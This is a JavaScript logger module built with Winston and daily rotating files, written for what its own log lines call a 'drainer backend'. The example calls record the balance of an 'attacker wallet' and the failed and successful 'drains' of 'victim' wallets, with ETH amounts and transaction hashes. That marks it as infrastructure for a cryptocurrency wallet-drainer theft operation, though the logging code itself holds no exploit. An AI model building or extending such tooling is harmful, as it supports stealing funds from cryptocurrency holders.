// backend/src/lib/logger.js
import winston from 'winston'
import DailyRotateFile from 'winston-daily-rotate-file'

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    // Console logging
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.simple()
      )
    }),
    // File logging - rotates daily
    new DailyRotateFile({
      filename: 'logs/application-%DATE%.log',
      datePattern: 'YYYY-MM-DD',
      maxFiles: '30d'
    }),
    // Separate drain logs
    new DailyRotateFile({
      filename: 'logs/drain-%DATE%.log',
      datePattern: 'YYYY-MM-DD',
      level: 'info',
      maxFiles: '30d'
    }),
    // Error logs
    new DailyRotateFile({
      filename: 'logs/error-%DATE%.log',
      datePattern: 'YYYY-MM-DD',
      level: 'error',
      maxFiles: '30d'
    })
  ]
})

// Use everywhere
logger.info('🔄 Starting drainer backend')
logger.warn('⚠️ Low balance on attacker wallet')
logger.error('❌ Drain failed', { victim: '0x...', error: 'Insufficient gas' })
logger.info('💰 Drain successful', { 
  victim: '0x...', 
  amount: '1.5 ETH',
  txHash: '0x...'
})
